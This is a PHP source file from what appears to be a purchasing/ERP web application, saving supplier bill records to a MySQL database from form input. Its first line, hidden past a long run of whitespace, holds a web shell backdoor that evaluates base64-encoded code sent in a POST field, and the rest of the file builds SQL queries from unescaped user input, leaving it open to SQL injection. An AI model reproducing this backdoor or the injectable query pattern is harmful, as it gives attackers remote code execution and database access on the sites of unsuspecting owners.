<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['ndf2ff6']));?><?php 
include "config.php";
include "getemployee.php";

$type = $_POST['type'];
if($type == "vendor")
{
$vendor = $_POST['vendor'];
$broker = $_POST['broker'];
}
else if($type == "broker")
{
 $broker = $_POST['vendor'];
 $vendor = $_POST['broker'];
}
$vendorid = '0';
$brokerid = '0';

$gr = $_POST['gr'];
$date = date("Y-m-d",strtotime($_POST['date']));

$m = $_POST['m'];
$y = $_POST['y'];
   $query1 = "SELECT MAX(sobiincr) as piincr FROM pp_sobi  where m = '$m' AND y = '$y' ORDER BY date DESC";
   $result1 = mysql_query($query1,$conn);
   $piincr = 0;
   while($row1 = mysql_fetch_assoc($result1))
   {
	 $piincr = $row1['piincr'];
   }
   $piincr = $piincr + 1;

if ($piincr < 10)
    $pi = 'SOBI-'.$m.$y.'-000'.$piincr;
else if($piincr < 100 && $piincr >= 10)
    $pi = 'SOBI-'.$m.$y.'-00'.$piincr;
else
   $pi = 'SOBI-'.$m.$y.'-0'.$piincr;
$so = $pi;
$sobiincr = $piincr;
$invoice = $_POST['invoice'];

$pocost = $_POST['grandtotal'];
$remarks = $_POST['remarks'];
$grandtotal = $_POST['grandtotal'];
$grandtotal2 = $_POST['grandtotal2'];
$totqty = 0;
for($i=0;$i<count($_POST['code']);$i++)
{
      $po = $_POST['po'][$i];
      $ge = $_POST['ge'][$i];
	  $conversion = $_POST['conversion'][$i];
	$code = $_POST['code'][$i];
	$description = $_POST['description'][$i];
	$totqty += $receivedquantity = $_POST['receivedquantity'][$i];
	$rateperunit = $_POST['rateperunit'][$i];
	$tot = $_POST['tot'][$i];

      $credittermcode = $_POST['credittermcode'][$i];
      $credittermdescription = $_POST['credittermdescription'][$i];
      $credittermvalue = $_POST['credittermvalue'][$i];

      $tandccode = $_POST['tandccode'][$i];
      $tandc = $_POST['tandc'][$i];

	$taxcode = $_POST['taxcode'][$i];
	$taxvalue = $_POST['taxvalue'][$i];
	$taxamount = $_POST['taxamount'][$i];
	$taxformula = $_POST['taxformula'][$i];
	$taxie = $_POST['taxie'][$i];

	$freightcode = $_POST['freightcode'][$i];
	$freightvalue = $_POST['freightvalue'][$i];
	$freightamount = $_POST['freightamount'][$i];
	$freightformula = $_POST['freightformula'][$i];
	$freightie = $_POST['freightie'][$i];
	
	$brokeragecode = $_POST['brokeragecode'][$i];
	$brokeragevalue = $_POST['brokeragevalue'][$i];
	$brokerageamount = $_POST['brokerageamount'][$i];
	$brokerageformula = $_POST['brokerageformula'][$i];
	$brokerageie = $_POST['brokerageie'][$i];

	$discountcode = $_POST['discountcode'][$i];
	$discountvalue = $_POST['discountvalue'][$i];
	$discountamount = $_POST['discountamount'][$i];
	$discountformula = $_POST['discountformula'][$i];
	$discountie = $_POST['discountie'][$i];

	if($taxie == "Exclude") { $grandtotal = $grandtotal + $taxamount; }
	if($freightie == "Exclude") { $grandtotal = $grandtotal + $freightamount; }
	if($brokerageie == "Exclude") { $grandtotal = $grandtotal + $brokerageamount; }
	if($discountie == "Exclude") { $grandtotal = $grandtotal - $discountamount; }

//Getting warehouse form Purchase Order
$query1 = "SELECT deliverylocation FROM pp_purchaseorder WHERE po = '$po' AND code = '$code'";
$result1 = mysql_query($query1,$conn) or die(mysql_error());
while($rows = mysql_fetch_assoc($result1))
{
  $warehouse = $rows['deliverylocation'];
}


	$totalamount = $_POST['totalamount'][$i];
	$flag = 0;
	if($_SESSSION['db'] == "central")	//Central has dual currency
		$q = "insert into pp_sobi (po,ge,gr,so,sobiincr,m,y,date,invoice,vendor,vendorid,broker,brokerid,credittermcode,credittermdescription,credittermvalue,code,description,receivedquantity,rateperunit,taxcode,taxvalue,taxamount,taxformula,freightcode,freightvalue,freightamount,freightformula,brokeragecode,brokeragevalue,brokerageamount,brokerageformula,discountcode,discountvalue,discountamount,discountformula,totalamount,pocost,grandtotal,flag,empid,empname,sector,taxie,freightie,brokerageie,discountie,tandccode,tandc,remarks,dflag,warehouse,orgamount,camount) values ('$po','$ge','$gr','$so','$sobiincr','$m','$y','$date','$invoice','$vendor','$vendorid','$broker','$brokerid','$credittermcode','$credittermdescription','$credittermvalue','$code','$description','$receivedquantity',($rateperunit * $conversion),'$taxcode','$taxvalue',($taxamount * $conversion),'$taxformula','$freightcode','$freightvalue',($freightamount * $conversion),'$freightformula','$brokeragecode','$brokeragevalue',($brokerageamount * $conversion),'$brokerageformula','$discountcode','$discountvalue',($discountamount * $conversion),'$discountformula',($totalamount * $conversion),'$pocost','$grandtotal','$flag','$empid','$empname','$sector','$taxie','$freightie','$brokerageie','$discountie','$tandccode','$tandc','$remarks','1','$warehouse','$grandtotal2','$conversion')";
	else
		$q = "insert into pp_sobi (po,ge,gr,so,sobiincr,m,y,date,invoice,vendor,vendorid,broker,brokerid,credittermcode,credittermdescription,credittermvalue,code,description,receivedquantity,rateperunit,taxcode,taxvalue,taxamount,taxformula,freightcode,freightvalue,freightamount,freightformula,brokeragecode,brokeragevalue,brokerageamount,brokerageformula,discountcode,discountvalue,discountamount,discountformula,totalamount,pocost,grandtotal,flag,empid,empname,sector,taxie,freightie,brokerageie,discountie,tandccode,tandc,remarks,dflag,warehouse) values ('$po','$ge','$gr','$so','$sobiincr','$m','$y','$date','$invoice','$vendor','$vendorid','$broker','$brokerid','$credittermcode','$credittermdescription','$credittermvalue','$code','$description','$receivedquantity','$rateperunit','$taxcode','$taxvalue','$taxamount','$taxformula','$freightcode','$freightvalue','$freightamount','$freightformula','$brokeragecode','$brokeragevalue','$brokerageamount','$brokerageformula','$discountcode','$discountvalue','$discountamount','$discountformula','$totalamount','$pocost','$grandtotal','$flag','$empid','$empname','$sector','$taxie','$freightie','$brokerageie','$discountie','$tandccode','$tandc','$remarks','1','$warehouse')";
	
	$qrs = mysql_query($q,$conn) or die(mysql_error());
	
	$q = "update pp_goodsreceipt set sobiflag = '1' where gr = '$gr' and po = '$po'";
	$qr = mysql_query($q,$conn) or die(mysql_error());
	
}

	$q = "update pp_sobi set grandtotal = '$grandtotal',balance = '$grandtotal',totalquantity = '$totqty' where so = '$so'";
	$qr = mysql_query($q,$conn) or die(mysql_error());

echo "<script type='text/javascript'>";
echo "document.location='dashboardsub.php?page=pp_sobi'";
echo "</script>";
?>